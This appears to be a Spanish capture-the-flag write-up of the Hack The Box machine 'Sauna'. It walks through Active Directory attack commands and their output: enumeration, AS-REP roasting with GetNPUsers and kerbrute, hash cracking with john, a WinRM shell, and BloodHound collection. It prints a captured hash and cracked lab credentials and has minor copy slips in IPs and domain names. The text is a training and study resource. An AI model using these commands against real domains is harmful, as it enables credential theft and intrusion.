---
title: "HTB: Resolución de Sauna"
date: 2023-07-18 12:00:00 +/-TTTT
categories: [HTB, Active Directory]
tags: [asreproasting, kerberoasting, bloodhound, dcsync, pass the hash, mimikatz.exe, crackmapexec, rpcclient, smbmap, smbclient, getnpusers.py, kerbrute, john, evil-winrm, sharphound.exe, winpeas.exe, credenciales autologon, secretsdump.py, getuserspns.py, ntpdate, adsearch.exe, rubeus.exe, hashcat]     # TAG names should always be lowercase
image: sauna.png
img_path: /photos/2023-07-18-Sauna-WriteUp/
---

**Sauna** es una máquina **Windows** de **dificultad fácil** enfocada en la enseñanza de técnicas de ataque en entornos de ***Active Directory***. Comenzando por un ataque ***ASREPRoast***, que es llevado a cabo utilizando los nombres de miembros del equipo obtenidos desde el servicio web, se logra el primer acceso a la máquina. Una vez dentro, se hace uso de la herramienta ***BloodHound*** para analizar la configuración de los grupos de Active Directory y detectar potenciales vectores de escalada de privilegios. 

En este contexto, destaca el usuario `svc_loanmgr`, que posee permisos DCSync sobre el dominio. Las credenciales de `svc_loanmgr`, ocultas entre las credenciales de AutoLogon de Windows, permiten explotar el **ataque** ***DCSync***, obteniendo así los privilegios de **administrador del dominio**. 

Para una mayor profundidad en el estudio de la máquina, se han incluido tres Anexos. En el **[Anexo I](#anexo-i-comprensión-y-explotación-del-kerberoasting)**, se detalla el ataque ***Kerberoasting***. En el **[Anexo II](#anexo-ii-ataque-kerberoasting-y-asreproast-utilizando-adsearch-y-rubeus)**, se presentan otras formas de explotar el ASREPRoasting y el Kerberoasting utilizando la herramienta ***Rubeus***. Por último, el **[Anexo III](#anexo-iii-ataque-dcsync-utilizando-mimikatz)** ofrece una alternativa para explotar el ataque DCSync mediante el uso de la herramienta ***mimikatz***.

## Reconocimiento

En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.

### Identificación del Sistema Operativo con Ping

Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.

El _**TTL**_ indica cuánto tiempo o "saltos" debe permanecer el paquete en la red antes de que se descarte. Los sistemas operativos establecen diferentes valores predeterminados de TTL para los paquetes que salen, por lo que podemos usar el TTL para obtener una idea del sistema operativo del host remoto.

En este caso, un _**TTL**_ menor o igual a **64** generalmente indica que la máquina es **Linux** y un _**TTL**_ menor o igual a **128** indica que la máquina es **Windows**.

```bash
r1pfr4n@parrot> ping -c 1 10.10.10.175

PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=113 ms

--- 10.10.10.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.251/113.251/113.251/0.000 ms
```

Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.

### Descubrimiento de puertos

El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.

El comando que utilizamos es bastante detallado y hace uso de varias opciones de nmap:

-   `-sS`: Realiza un escaneo SYN. Este es un tipo de escaneo sigiloso que no completa las conexiones TCP a los puertos del host objetivo.
-   `--min-rate 5000`: Establece el número mínimo de paquetes que nmap intentará enviar por segundo.
-   `-n`: No resuelve los nombres de los hosts.
-   `-Pn`: Trata al host como si estuviera en línea y omite la fase de descubrimiento.
-   `-p-`: Escanea todos los puertos (equivalente a `-p 1-65535`).
-   `-vvv`: Aumenta la verbosidad del programa. 
-   `--open`: Muestra solo los puertos abiertos.
-   `-oG allPorts`: Guarda la salida en formato *greppable*, que es más fácil de procesar con otros programas y scripts (este formato lo utilizo para poder filtrar los puertos abiertos de los resultados del escaneo mediante expresiones regulares).

Aquí están los resultados:

```bash
r1pfr4n@parrot> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.10.175 -oG allPorts

...[snip]...
Nmap scan report for 10.10.10.175
Host is up, received user-set (0.12s latency).
Scanned at 2023-07-17 17:31:20 CEST for 40s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
...[snip]...
```

Tras descubrir los puertos abiertos, procedemos a realizar un **escaneo más detallado** para conocer las versiones y los servicios que se están ejecutando en esos puertos.

```bash
r1pfr4n@parrot> sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49677,49689,49698 10.10.10.175 -oN targeted

...[snip]...
Nmap scan report for 10.10.10.175
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 22:32:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-17T22:33:28
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 6h59m56s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.66 seconds
```

El comando `-sCV` realiza un escaneo de versión (-sV) y ejecuta *scripts* por defecto (-sC).

El resultado de este escaneo revela información adicional sobre los servicios en ejecución, como versiones y detalles de la configuración. A continuación, se proporciona un desglose detallado de los servicios que se han identificado en la máquina objetivo utilizando una tabla. Para cada servicio, se describe brevemente su propósito y su relevancia potencial.


| Puerto(s)                                     | Servicio                          | Descripción                                                                                                                     | Relevancia                                                                                                                                     |
| --------------------------------------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| 53                                            | Domain (DNS)                      | El servicio DNS se utiliza para resolver nombres de dominio en direcciones IP y viceversa.                                      | Las configuraciones incorrectas o las entradas DNS malintencionadas pueden ser explotadas.                                                     |
| 88                                            | Kerberos                          | Kerberos es un protocolo de autenticación de red.                                                                               | Las vulnerabilidades o debilidades en Kerberos pueden permitir la escalada de privilegios o la falsificación de identidad.                     |
| 135, 49668, 49673, 49674, 49677, 49689, 49698 | MSRPC                             | Microsoft Remote Procedure Call (RPC) permite a los procesos comunicarse en una red.                                            | Los problemas de configuración o las vulnerabilidades en RPC pueden permitir la ejecución remota de código.                                    |
| 139/445                                       | NetBIOS-ssn/Microsoft-ds          | NetBIOS y SMB son protocolos de compartición de archivos y servicios.                                                           | Las vulnerabilidades en SMB pueden permitir la ejecución remota de código, la escalada de privilegios o la revelación de información sensible. |
| 389/636, 3268/3269                            | LDAP/LDAP SSL/Global Catalog LDAP | El Protocolo Ligero de Acceso a Directorios (LDAP) se utiliza para acceder y gestionar directorios distribuidos sobre redes IP. | Las configuraciones incorrectas o las vulnerabilidades en LDAP pueden permitir la enumeración de usuarios o la escalada de privilegios.        |
| 464                                           | kpasswd5                          | Este puerto está asociado con el servicio de cambio de contraseña de Kerberos.                                                  | Las vulnerabilidades asociadas pueden permitir la modificación de contraseñas de usuario.                                                      |
| 593                                           | ncacn_http                        | Puntos de extremo de mapeo para RPC sobre HTTP.                                                                                 | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código.                                               |
| 5985                                          | WinRM                             | Estos servicios permiten el acceso remoto a los sistemas de administración.                                                     | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código o la escalada de privilegios.                  |
| 9389                                          | .NET Message Framing              | Este puerto se utiliza para la comunicación en el marco de mensajes .NET.                                                       | Las vulnerabilidades pueden permitir ataques de inyección de código o la ejecución remota de código.                                           |
| 80 | http | Microsoft IIS httpd 10.0 | Un servidor web puede albergar páginas web, aplicaciones web, interfaces de API y más. Las vulnerabilidades en el servidor web pueden permitir ataques de inyección, divulgación de información y más. |                                              |                                   |                                                                                                                                 |                                                                                                                                                |

### Puertos 139/445 abiertos (SMB)

**El protocolo SMB (Server Message Block)**, que opera a través de los puertos 139 y 445, se selecciona para un reconocimiento inicial por su relevancia en la configuración de redes Windows y su conocido historial de vulnerabilidades explotables.

SMB es un protocolo de red que proporciona servicios compartidos de archivos e impresoras. Aunque es un componente esencial en los sistemas operativos Windows, también puede encontrarse en otras plataformas.

Para empezar, se utiliza la herramienta `crackmapexec` para recopilar más información sobre el servicio SMB que se ejecuta en la máquina objetivo. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.175
```

![imagen 2](Pasted image 20230718031037.png)

Este resultado muestra que la máquina objetivo está ejecutando un **Windows 10.0 de 64 bits**, su nombre es "**SAUNA**" y es parte del dominio "**EGOTISTICAL-BANK.LOCAL**". Además, se descubre que el **protocolo SMBv1** está habilitado en la máquina.

Para facilitar trabajos futuros, se añade el dominio "EGOTISTICAL-BANK.LOCAL" al archivo `/etc/hosts` para permitir que se resuelva localmente:

![imagen 3](Pasted image 20230717173647.png)

A continuación, se intenta enumerar los **recursos compartidos disponibles** en la máquina objetivo. Sin embargo, a pesar de probar con diferentes herramientas, no se encuentran recursos compartidos accesibles.

Las **herramientas** y comandos utilizados para intentar enumerar los recursos compartidos son los siguientes:

```bash
r1pfr4n@parrot> smbclient -L 10.10.10.175 -N
r1pfr4n@parrot> crackmapexec smb 10.10.10.175 -u '' -p '' --shares
r1pfr4n@parrot> smbmap -H 10.10.10.175 -u 'test'
```

El comando `smbclient` proporciona la siguiente salida:

```bash
r1pfr4n@parrot> smbclient -L 10.10.10.175 -N

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Esto sugiere que el acceso anónimo es factible, pero **no se logra visualizar ningún recurso compartido disponible**. Esto puede indicar que los recursos compartidos están restringidos a determinados usuarios, o simplemente que no existen en la máquina objetivo.

### Puerto 135 abierto (RPC)

**RPC (Remote Procedure Call)** es una tecnología utilizada en los sistemas operativos Windows para permitir que un programa ejecute código de manera remota. En este contexto, el puerto 135 se ha explorado porque ofrece múltiples oportunidades para la **enumeración de recursos del dominio**, incluyendo **usuarios, grupos, políticas** y más.

Aunque uno podría esperar que la enumeración de recursos requiriera credenciales válidas, en ciertas configuraciones de Active Directory, la **enumeración de recursos** puede ser posible incluso para un **usuario invitado**. La razón es que a veces la política de seguridad se configura de tal manera que la enumeración de los recursos de un dominio está permitida para todos los usuarios, incluso los no autenticados.

Para conectar con el servicio RPC se ha utilizado el siguiente comando:

```bash
r1pfr4n@parrot> rpcclient -U "" -N 10.10.10.161
```

Sin embargo, el intento de enumerar los usuarios y grupos del dominio utilizando una sesión de invitado fue infructuoso. Los comandos ejecutados y sus respectivas salidas fueron:

```bash
rpcclient $> enumdomusers 
	result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups 
	result was NT_STATUS_ACCESS_DENIED
```

Estos resultados indican que, en este caso, los **permisos para enumerar los usuarios y grupos del dominio están restringidos**, incluso para un usuario invitado.

### Puerto 80 abierto (HTTP)

El **puerto 80**, conocido por ser el puerto estándar para las comunicaciones HTTP no cifradas, fue **identificado como abierto** durante la fase de exploración inicial. 

El primer paso fue examinar las **tecnologías subyacentes** de la página web utilizando el comando `whatweb`. Este comando busca varias tecnologías web y metadatos que pueden proporcionar información útil sobre la configuración del servidor web y sus posibles vulnerabilidades. Se ejecutó el siguiente comando:

```bash
r1pfr4n@parrot> whatweb 10.10.10.175
```

El resultado de este comando fue:

![imagen 4](Pasted image 20230717174147.png)

No hubo hallazgos particularmente notables a partir de esta exploración inicial. Sin embargo, el próximo paso fue acceder a la página web en sí en `http://10.10.10.175`. A primera vista, no parecía haber nada inusual en la página. No obstante, en la pestaña "**About Us**", se encontraron los nombres de varios miembros del equipo. 

![imagen 5](Pasted image 20230718005559.png)

Esto planteó la posibilidad de explotar un **ataque ASREPRoast**. 

Se extrajeron los siguientes nombres y se almacenaron en un archivo llamado `users.txt`:

- Fergus Smith
- Shaun Coins
- Hugo Bear
- Bowie Taylor
- Sophie Driver
- Steven Kerb

Para maximizar las posibilidades de éxito con un ataque ASREPRoast, se utilizó un script para generar una variedad de posibles combinaciones de nombre de usuario a partir de estos nombres. Este script, disponible en [https://gist.github.com/superkojiman/11076951](https://gist.github.com/superkojiman/11076951), genera permutaciones basándose en los nombres y apellidos proporcionados, como `scoins`, `s.coins`, `shaun.coins`, etc. 

El comando ejecutado para generar estas permutaciones fue:

```bash
r1pfr4n@parrot> python3 namemash.py users.txt | sponge users.txt
```

El uso del comando `sponge` permitió escribir el resultado de las permutaciones de nuevo en el archivo `users.txt`.

El resultado fue el siguiente:

```txt
fergussmith
smithfergus
fergus.smith
smith.fergus
smithf
fsmith
sfergus
f.smith
s.fergus
fergus
smith
shauncoins
coinsshaun
shaun.coins
coins.shaun
coinss
scoins
cshaun
s.coins
c.shaun
shaun
coins
sophiedriver
driversophie
sophie.driver
driver.sophie
drivers
sdriver
dsophie
s.driver
d.sophie
sophie
driver
bowietaylor
taylorbowie
bowie.taylor
taylor.bowie
taylorb
btaylor
tbowie
b.taylor
t.bowie
bowie
taylor
hugobear
bearhugo
hugo.bear
bear.hugo
bearh
hbear
bhugo
h.bear
b.hugo
hugo
bear
stevenkerb
kerbsteven
steven.kerb
kerb.steven
kerbs
skerb
ksteven
s.kerb
k.steven
steven
kerb
```

Con esta lista ampliada de posibles nombres de usuario, se dispone de una base sólida para intentar **explotar un ataque ASREPRoast** en futuras etapas del proceso de reconocimiento.

## Consiguiendo shell como fsmith

Una vez que tengamos nuestra lista de usuarios potencialmente válidos, estamos en posición de intentar un ataque ASREPRoast. Este ataque se basa en explotar una debilidad específica en el protocolo de autenticación Kerberos. 

Se explicará primero como funciona el protocolo Kerberos, luego en qué consiste el ataque ASREPRoast y finalmente se explotará el ataque para conseguir la contraseña del usuario *fsmith*.

### Protocolo Kerberos

El protocolo **Kerberos** proporciona autenticación mutua entre un cliente y un servidor en una red no segura. Esto se logra mediante el uso de tickets de concesión de servicio (TGS) y tickets de concesión de autenticación (TGT). A continuación se desglosan todos los pasos de la autenticación de Kerberos, teniendo en cuenta la siguiente imagen:

![imagen 6](Pasted image 20230715184901.png)

1.  **Solicitud de TGT**: El cliente envía una solicitud al Servicio de Autenticación (AS) para obtener un TGT.
2.  **Emisión de TGT**: El AS verifica las credenciales del cliente. Si son válidas, el AS emite un TGT y una clave de sesión al cliente. El TGT está cifrado con la clave del servicio de concesión de ticket (KRBTGT) y la **clave de la sesión** **se cifra con la contraseña del cliente**. Esta última es la parte que se explota en el ataque **ASREPRoast**.
3.  **Solicitud de TGS**: Cuando el cliente desea acceder a un servicio, envía una solicitud al Servicio de Concesión de Ticket (TGS), incluyendo el TGT y un autenticador que contiene la ID del cliente y la marca de tiempo, cifrado con la clave de sesión.
4.  **Emisión de TGS**: El TGS descifra el TGT, obteniendo la clave de la sesión, y luego descifra el autenticador. Si la solicitud es válida, el TGS emite un ticket de servicio (cifrado con la clave del servicio) y una nueva clave de sesión (cifrado con la contraseña del cliente) al cliente.    
5.  **Solicitud de servicio**: El cliente se comunica con el servidor enviando el ticket de servicio y un nuevo autenticador cifrado con la nueva clave de sesión.
6.  **Acceso al servicio**: El servidor SQL descifra el ticket de servicio con su clave, obteniendo la nueva clave de sesión, y luego descifra el autenticador. Si la solicitud es válida, el cliente es autenticado y puede acceder al servicio.

### ASREPRoast o AS-REP Roasting en detalle

ASREPRoast, también conocido como AS-REP Roasting, debe su nombre a la etapa de respuesta AS-REP del protocolo Kerberos, que es donde se lleva a cabo el ataque. Se centra en explotar una característica específica de la implementación de Kerberos: la capacidad de desactivar la **"preautenticación"**.

Cuando un usuario solicita un TGT al **Servicio de Autenticación (AS)**, normalmente debe proporcionar preautenticación, una prueba de que conoce su contraseña, antes de que se le otorgue un TGT.

Si la preautenticación está desactivada para un usuario, el AS devuelve un mensaje AS-REP que incluye el TGT y la **clave de sesión cifrada con la contraseña del usuario**. Este mensaje normalmente requeriría una prueba de conocimiento de la contraseña, pero sin preautenticación, se proporciona directamente.

Un atacante puede solicitar un TGT para dicho usuario y recibir la clave de sesión cifrada sin necesidad de conocer previamente la contraseña del usuario. Esto es crucial para el ataque ASREPRoast.

El ataque ASREPRoast implica la captura de estas **claves de sesión cifradas** y su descifrado fuera de línea mediante técnicas de fuerza bruta. Como la clave de la sesión está cifrada con la contraseña del usuario, descifrar la clave de sesión resulta en obtener la contraseña del usuario.

### Explotación de ASREPRoast para obtener las credenciales de fsmith

Disponiendo de la lista de posibles nombres de usuario generada en la etapa de reconocimiento, se procede a intentar un **ataque** **ASREPRoast**. Este tipo de ataque involucra la identificación de usuarios que no tienen establecida la preautenticación y luego captura su clave de sesión cifrada para descifrarla fuera de línea. El primer paso en este proceso es identificar cuáles usuarios son válidos y cuáles tienen la configuración de **UF_DONT_REQUIRE_PREAUTH**, lo que permitirá **obtener la clave de sesión**.

Para ello, se puede utilizar la herramienta **Kerbrute**. No sólo puede identificar usuarios válidos de un dominio a partir de una lista de usuarios, sino que también puede detectar si un usuario es vulnerable a ASREPRoast. Si un usuario es vulnerable, Kerbrute mostrará su hash.

Otra herramienta que se puede utilizar en conjunto con Kerbrute es **GetNPUsers**. Al igual que Kerbrute, GetNPUsers puede detectar usuarios válidos y aquellos que son vulnerables a ASREPRoast.

-   Utilizando **GetNPUsers.py**:

```bash
r1pfr4n@parrot> GetNPUsers.py -no-pass -usersfile users.txt egotistical-bank.local/ -outputfile hash
```

Esta herramienta es de  [Impacket](https://github.com/fortra/impacket).

- Utilizando **Kerbrute**:

```bash
r1pfr4n@parrot> kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local ./users.txt --hash-file hash --downgrade
```

Podemos descargar Kerbrute del siguiente repositorio: https://github.com/ropnop/kerbrute.

Ambos comandos solicitan un TGT para cada usuario válido de `users.txt` en el dominio `htb.local`. Si la preautenticación está desactivada para algún usuario, se recibe un TGT cifrado junto con la clave de sesión cifrada, que se guarda en el archivo `hash`.

Los resultados indican que el usuario `fsmith` tiene habilitado el atributo `UF_DONT_REQUIRE_PREAUTH` y, por lo tanto, es **vulnerable a ASREP-Roasting**:

![imagen 7](Pasted image 20230718005511.png)

EL **hash capturado** es el siguiente:

```bash
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:99867b006628a763685ba371d896f5a7$6d93dd00115c9914e466138667cb821058d3cb1b8492c6d562fedeb71485c542040edbe1be8bbb767d41d147addd497dc7076052464f22bbc0fe9550a39d6d1c7391966bfce41a62292081ebc802a51ad64ccf46d99c7cd237a5d34f2c9a1564bd8387c71ca1a732d8191da80e7381207b0efd7d4c1d0ee4436a9f4830a4968006582003aeb69e7ce71c2877f9fa320cf34e02d40ba52d3b771b79016caf9a118c2d383b702c44a52e11807950b416a2f025761876a984d537e58024e5d5716a1294007a077387b9f851fc28bf202f221a0715c2b9fed089a64dcdfdf35b74deb3ce8ee05b5bd9d7c59433dd619371e48e3d2bf54e47ec40a3d29231a729339f
```

El siguiente paso es intentar descifrarlo utilizando una herramienta como `john` y una lista de palabras conocida, en este caso, `rockyou.txt`:

```bash
r1pfr4n@parrot> john -w=/usr/share/wordlists/rockyou.txt hash --format=krb5asrep
```

Este comando utiliza `john` para realizar un ataque de fuerza bruta en el hash obtenido, intentando cada palabra en `rockyou.txt` como una posible contraseña. Finalmente, se logra descifrar la clave de sesión y se obtiene la contraseña del usuario `fsmith`: `Thestrokes23`:

![imagen 8](Pasted image 20230718005418.png)

### Obtención de shell a través de WinRM como fsmith

Ahora que se ha obtenido las credenciales de `fsmith`, es posible avanzar y explorar nuevas formas de explotación. En concreto, se buscará acceder a la máquina objetivo utilizando el servicio **Windows Remote Management (WinRM)**.

**WinRM** es un servicio de administración remota basado en estándares que se incluye con Windows Server. Permite a los administradores de sistemas ejecutar comandos de administración y scripts en sistemas remotos a través de la red. Recordemos que, durante la fase de escaneo inicial, se identificó que el puerto **5985**, el puerto predeterminado para WinRM, estaba abierto.

Antes de intentar la conexión, es importante verificar que el usuario `fsmith` tiene permisos para acceder al servicio WinRM. Para ello, se utiliza la herramienta `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

Este comando verifica si las credenciales proporcionadas permiten el acceso al servicio WinRM en el host objetivo. Si el resultado muestra `Pwned!`, eso indica que el usuario `fsmith` tiene los permisos necesarios para acceder a WinRM, probablemente debido a que pertenece al grupo `Remote Management Users`.

![imagen 9](Pasted image 20230718005333.png)

Una vez confirmado el acceso, se puede conectar a WinRM utilizando la herramienta `evil-winrm`:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

`Evil-winrm` es una herramienta de shell interactiva que permite la administración remota de la máquina objetivo. Al ejecutar el comando anterior, se inicia una conexión con la máquina objetivo a través del servicio WinRM utilizando las credenciales de `fsmith`. Si todo sale según lo previsto, se obtendrá una shell que permitirá una exploración más profunda del sistema:

![imagen 10](Pasted image 20230718010056.png)

Es importante notar que, además de la ruta de ataque utilizada en este escenario, hay otra que podría ser viable: **el ataque Kerberoasting**. De hecho, hay una **cuenta susceptible a Kerberoasting** en el sistema, pero no tiene privilegios elevados. Sin embargo, dado que la máquina objetivo no se resolvió a través de este método en este caso, se ha decidido incluir el ataque Kerberoasting en [Anexo I: Comprensión y explotación del Kerberoasting](#anexo-i-comprensión-y-explotación-del-kerberoasting).

### user.txt

Encontraremos la **primera flag** en el directorio **Desktop** del usuario **fsmith**:

```powershell
PS C:\Users\FSmith\Desktop> type user.txt
494d76da2c10****65fad9398241be34
```

## Consiguiendo shell como Administrador del dominio

Después de obtener una *shell* inicial con el usuario *fsmith*, el siguiente objetivo es escalar privilegios hasta conseguir una *shell* como **administrador del dominio**. Para esto, se debe realizar una serie de tareas de enumeración y explotación adicionales.

### Enumeración

El primer paso en este proceso de escalado de privilegios es la enumeración adicional del Controlador de Dominio (DC). 

#### Enumeración con BloodHound

Durante el proceso de infiltración en una red, especialmente en entornos Active Directory, es esencial realizar una tarea de enumeración detallada. En este contexto, la utilización de **BloodHound** es de gran valor, dado que permite visualizar de forma gráfica las **relaciones existentes entre los elementos del dominio** (usuarios, grupos, computadoras, etc.), facilitando el **descubrimiento de caminos de ataque**.

##### ¿Qué es BloodHound y cómo funciona?

**BloodHound** es una herramienta de análisis gráfico de relaciones en Active Directory que utiliza la *teoría de grafos* para descubrir las posibles vías de ataque menos privilegiadas que pueden llevar a una entidad a obtener más privilegios dentro del dominio. La herramienta utiliza su colector, **SharpHound**, para recolectar información del dominio y luego presenta esta información en una interfaz gráfica que facilita su análisis.

##### Recolección de información con SharpHound

Para obtener la información necesaria, se utiliza **SharpHound**. Esta herramienta se puede encontrar en versión [.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) o bien en versión [.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1). 

El primer paso será subir **SharpHound.exe** al controlador de dominio. En este caso se utilizará el comando `upload` de **evil-winrm**:

```powershell
PS C:\Users\FSmith\Desktop> upload /home/r1pfr4n/Desktop/HTB/Sauna/content/SharpHound.exe
```

Seguidamente se ejecutará SharpHound.exe con los siguientes parámetros:

```powershell
PS C:\Users\FSmith\Desktop> .\SharpHound.exe -c all --LdapUsername 'fsmith' --LdapPassword 'Thestrokes23' --domaincontroller 10.10.10.175 -d egotistical-bank.local
```

Los parámetros utilizados en este comando son:

- `-c all`: Recoge todos los tipos de datos disponibles.
- `--LdapUsername` y `--LdapPassword`: Se especifican las credenciales de un usuario válido en el dominio, en este caso 'fsmith' con la contraseña 'Thestrokes23'.
- `--domaincontroller`: Se especifica la dirección IP del controlador de dominio, 10.10.10.175 en este caso.
- `-d egotistical-bank.local`: Se especifica el nombre del dominio.

![imagen 11](Pasted image 20230718015619.png)

Finalizada la ejecución, **SharpHound.exe** generará un archivo **zip** con los **datos que ha recolectado**. Este zip deberá ser transportado a la máquina atacante para su posterior análisis con **BloodHound**. En este caso se utilizará el comando `download` de **evil-winrm**:

```powershell
PS C:\Users\FSmith\Desktop> download C:\Users\FSmith\Desktop\20230715012300_BloodHound.zip bh.zip
```

Más información sobre la utilización de **SharpHound** y posibles configuraciones de la herramienta se puede encontrar en la página de [The Hacker Recipes](https://www.thehacker.recipes/ad/recon/bloodhound).

##### Configuración de Neo4j y BloodHound

**BloodHound** necesita una base de datos para operar, y utiliza **Neo4j**, una base de datos gráfica. Si no está instalado, se puede seguir la guía de instalación de la [documentación oficial de Neo4j](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation). 

Los comandos para instalar **neo4j 5.6.0** son los siguientes:

```bash
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee -a /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install neo4j=1:5.6.0
```

Una vez instalado **Neo4j**, se debe ejecutar con el comando `sudo neo4j console`. Si es la primera vez que se inicia, se deberá **configurar un usuario y una contraseña** que se usarán después en BloodHound. El panel de configuración de Neo4j suele residir en http://localhost:7474/.

##### Ejecución de BloodHound

Con **Neo4j** funcionando, ya se puede iniciar **BloodHound**. Para ello, es necesario descargar la versión adecuada para el sistema operativo desde el [repositorio oficial de BloodHound](https://github.com/BloodHoundAD/BloodHound/releases). Una vez descargado y descomprimido, se encontrará el ejecutable de BloodHound. Al ejecutarlo, aparecerá una pantalla de inicio de sesión en la que se deben proporcionar las credenciales configuradas en Neo4j.

Una vez se ha accedido a **BloodHound**, en la parte superior derecha, se debe pinchar en "**Upload Data**". En este punto, se deberá **subir** el **archivo zip generado por SharpHound**:

![imagen 12](Pasted image 20230716181840.png)

Al finalizar la carga de los archivos, ya se puede comenzar con el análisis y reconocimiento del dominio utilizando **BloodHound**.

##### Identificando el camino al dominio con BloodHound

Comenzando con el análisis, es una buena práctica **marcar** los usuarios cuyas credenciales se han obtenido como **Owned**. En este caso, se marca al usuario **fsmith**. Esta acción no es solo una cuestión de llevar un registro, sino que también abre la posibilidad de utilizar algunas consultas adicionales en **BloodHound**, que pueden revelar rutas de ataque potencialmente ocultas:

![imagen 13](Pasted image 20230718043347.png)

El análisis con BloodHound revela un posible camino de escalada de privilegios a través de un usuario del dominio llamado **svc_loanmgr**. Este usuario tiene **permisos de DCSync en el dominio egotistical-bank.local**:

![imagen 14](Pasted image 20230718020534.png)

Tener **permisos de DCSync** es altamente significativo en un contexto de seguridad. DCSync es una técnica que se utiliza para replicar el contenido de una base de datos de Active Directory. Un usuario con permisos DCSync puede solicitar del controlador de dominio los hashes de contraseña de cualquier usuario del dominio, incluyendo el administrador de dicho dominio. Esto es precisamente lo que se conoce como un **ataque DCSync**: un ataque que se aprovecha de los permisos DCSync para **obtener hashes de contraseñas** y, por ende, potencialmente **tomar el control de cuentas privilegiadas**.

![imagen 15](Pasted image 20230718022211.png)

No obstante, en este punto de la exploración, aún **no se poseen las credenciales** de **svc_loanmgr**. Para intentar obtenerlas, se decide proceder con la enumeración del controlador de dominio utilizando una herramienta llamada **winPEAS.exe**.

#### Enumeración del sistema con winPEAS.exe

